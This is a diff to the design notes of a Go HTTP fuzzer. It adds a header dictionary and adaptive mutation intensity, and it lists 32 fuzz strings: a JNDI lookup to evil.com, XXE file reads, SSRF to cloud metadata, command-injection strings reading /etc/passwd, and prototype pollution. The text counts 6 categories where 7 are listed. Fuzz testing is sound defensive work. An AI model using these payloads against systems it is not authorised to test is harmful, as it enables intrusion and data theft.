@@ -18,25 +18,35 @@ type ExchangeMutator interface {
 }
 
 type Config struct {
-    PathQuery      bool
-    Headers        bool
-    JSONBody       bool
-    Params         bool
-    Sequence       bool
-    Intensity      float64
-    MaxURLLen      int
-    MaxHdrLen      int
-    MaxBodyLen     int
-    UserDictionary map[string][]string
+    PathQuery           bool
+    Headers             bool
+    JSONBody            bool
+    Params              bool
+    Sequence            bool
+    Intensity           float64
+    MaxURLLen           int
+    MaxHdrLen            int
+    MaxBodyLen          int
+    UserDictionary      *Dictionary // header dictionary (nil = built-in only)
+    UserDictionaryPaths []string    // paths to dictionary files to load
 }
 
 type Pipeline struct {
-    cfg       Config
-    primitive *PrimitiveMutator
-    uri       *URIMutator
-    header    *HeaderMutator
-    jsonM     *JSONMutator
-    param     *ParamMutator
+    cfg           Config
+    primitive     *PrimitiveMutator
+    uri           *URIMutator
+    header        *HeaderMutator
+    jsonM         *JSONMutator
+    param         *ParamMutator
+    intensityFunc func(operatorPrefix string) float64 // optional: adaptive intensity
+}
+
+// Dictionary holds fuzzing dictionary entries with global and per-endpoint values.
+// It is safe for concurrent use from multiple worker goroutines.
+type Dictionary struct {
+    mu     sync.RWMutex
+    global map[string][]string            // header name → values
+    perEP  map[string]map[string][]string // endpoint pattern → header name → values
 }
 ```
 
@@ -99,11 +109,20 @@ Low-level byte manipulations applied to request bodies:
 
 ```go
 func (p *Pipeline) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
-    // Each class is applied independently with probability = intensity
-    if p.cfg.PathQuery && rng.Float64() < intensity { /* URI mutations */ }
-    if p.cfg.Headers   && rng.Float64() < intensity { /* header mutations */ }
-    if p.cfg.JSONBody  && rng.Float64() < intensity { /* JSON body mutations */ }
-    if p.cfg.Params    && rng.Float64() < intensity { /* param injection */ }
+    // When intensityFunc is set, each mutator class uses an effective probability
+    // of intensity * multiplier, where multiplier comes from adaptive tracking.
+    uriMult, hdrMult, jsonMult, paramMult := 1.0, 1.0, 1.0, 1.0
+    if p.intensityFunc != nil {
+        uriMult   = p.intensityFunc("uri")
+        hdrMult   = p.intensityFunc("header")
+        jsonMult  = p.intensityFunc("json")
+        paramMult = p.intensityFunc("param")
+    }
+
+    if p.cfg.PathQuery && rng.Float64() < intensity*uriMult   { /* URI mutations */ }
+    if p.cfg.Headers   && rng.Float64() < intensity*hdrMult   { /* header mutations */ }
+    if p.cfg.JSONBody  && rng.Float64() < intensity*jsonMult  { /* JSON body mutations */ }
+    if p.cfg.Params    && rng.Float64() < intensity*paramMult { /* param injection */ }
 
     // Fallback: if nothing was applied, apply primitive mutation
     if len(ops) == 0 {
@@ -116,27 +135,74 @@ func (p *Pipeline) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) 
 }
 ```
 
-Each mutation class applies independently based on the configured intensity. An exchange may receive zero, one, or multiple mutation classes in a single pass.
+Each mutation class applies independently based on the configured intensity multiplied by the per-operator multiplier from `intensityFunc`. An exchange may receive zero, one, or multiple mutation classes in a single pass.
+
+### Adaptive intensity
+
+The pipeline accepts an optional callback via `SetIntensityCallback(fn)` that returns a multiplier for each operator prefix. When set, the effective probability for each class is `intensity * multiplier`. When nil (default), static intensity is used. The engine wires this callback to an `IntensityTracker` that adjusts multipliers based on per-operator productivity (see [engine.md](engine.md)).
+
+### Dictionary
+
+The `Dictionary` type (`internal/mutate/dictionary.go`) provides:
+
+- **Global entries**: header values applicable to all endpoints
+- **Per-endpoint entries**: header values scoped to specific endpoint patterns, populated via `ExtractFromTraffic`
+- **Case-insensitive headers**: all header lookups are normalized to lowercase
+- **File loading**: JSON dictionaries via `NewDictionaryFromFile` and `LoadFromFiles`
+- **Traffic extraction**: `ExtractFromTraffic(sessions)` collects unique header values from recorded traffic, filtering out common Content-Types, User-Agents, and internal HTTP headers
+- **Concurrent access**: safe for use from multiple worker goroutines via `sync.RWMutex`
 
 ## Fuzz Strings
 
-A global `fuzzStrings` slice is shared by multiple mutators (JSON body string injection and param injection):
+A global `fuzzStrings` slice (32 entries) is shared by multiple mutators (JSON body string injection and param injection). It covers 6 attack categories:
 
 ```go
 var fuzzStrings = []string{
+    // Overflow / empty (4 entries)
     "",
     strings.Repeat("A", 1024),
     strings.Repeat("A", 65536),
     "\x00\x01\x02\x03",
+
+    // XSS / injection (6 entries)
     "<script>alert(1)</script>",
     "' OR '1'='1",
     "${jndi:ldap://evil.com/a}",
     "{{7*7}}",
     "../../../etc/passwd",
     "\r\nX-Injected: true",
+
+    // Unicode attacks (3 entries)
     "\u0000",
     "\uFFFD",
     strings.Repeat("\u202E", 100),
+
+    // XXE — XML External Entity (3 entries)
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ...> %xxe;]>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+
+    // SSRF — Server-Side Request Forgery (5 entries)
+    "http://169.254.169.254/latest/meta-data/",
+    "http://127.0.0.1:6379/",
+    "http://[::1]:22/",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_INFO",
+
+    // Command injection (7 entries)
+    "`id`",
+    "$(whoami)",
+    "; ls -la /",
+    "| cat /etc/passwd",
+    "\nid\n",
+    "& ping -c 10 127.0.0.1 &",
+    "$(sleep 5)",
+
+    // Prototype pollution (4 entries)
+    "__proto__",
+    "constructor",
+    `{"__proto__":{"isAdmin":true}}`,
+    `constructor[prototype][isAdmin]=true`,
 }
 ```
 
